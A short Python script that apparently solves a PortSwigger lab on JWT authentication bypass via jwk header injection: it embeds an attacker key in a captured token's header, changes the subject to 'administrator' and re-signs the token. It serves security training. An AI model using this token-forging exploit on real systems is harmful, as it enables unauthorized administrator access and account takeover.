# Lab: JWT authentication bypass via jwk header injection
from jwcrypto import jwt, jwk
import base64
import json

orig_jwt = "eyJraWQiOiJhZDE2MDdmMS1lOTZkLTQwZGMtYjYyOS04YzUwYWQ4Njk5MTQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2OTY5Njk4NX0.QxofRjNNS6gUcfO9mEvlaL0cAkqX-WDAB31yDUUQMLNq9832lmuEx1fhci6II_p7fJKJdzJ6S7b6V3NT5P9rEMGK9srdTMUj3PGvlyEseg_1S0jNOxc9AmFOahnwPsjTuikiN2AqqToujIQkvSkkHRAFur2QLTTffSmrYpWCAvNI9tw6F1w0OHD0jhN1clf52RH20aJD-4AV5DYi9AB4pX4qXGInqQm7GDjiYMpDEIBSIGc8I6yi529ZyQcDkbhwgN-f2ojFZtc8Rjby3aKwR3Qdmq0wxio3m0rveX_wN5BNymfWJ3iFaKo9D4uRbeJaGQd0DsjdsMOxBFbUZFTC_Q"
header, payload, sig = orig_jwt.split('.')

header_decode = base64.urlsafe_b64decode(
    header + '='*(len(header)//4)).decode()
header_json = json.loads(header_decode)

payload_decode = base64.urlsafe_b64decode(
    payload + '='*(len(payload)//4)).decode()
payload_json = json.loads(payload_decode)


segment = header + '.' + payload

with open("Portswigger/Labs_test_with_python/JWT/keypair.pem", "rb") as pemfile:
    key = jwk.JWK.from_pem(pemfile.read())

pub_key = key.export(private_key=False)
pub_key = json.loads(pub_key)

pub_key["kid"] = header_json["kid"]
header_json["jwk"] = pub_key
payload_json['sub'] = "administrator"

header = json.dumps(header_json)
payload = json.dumps(payload_json)
# print(header)
# print(payload)
# print(header_json['kid'])
Token = jwt.JWT(header=header, claims=payload)
Token.make_signed_token(key)
print(Token.serialize())
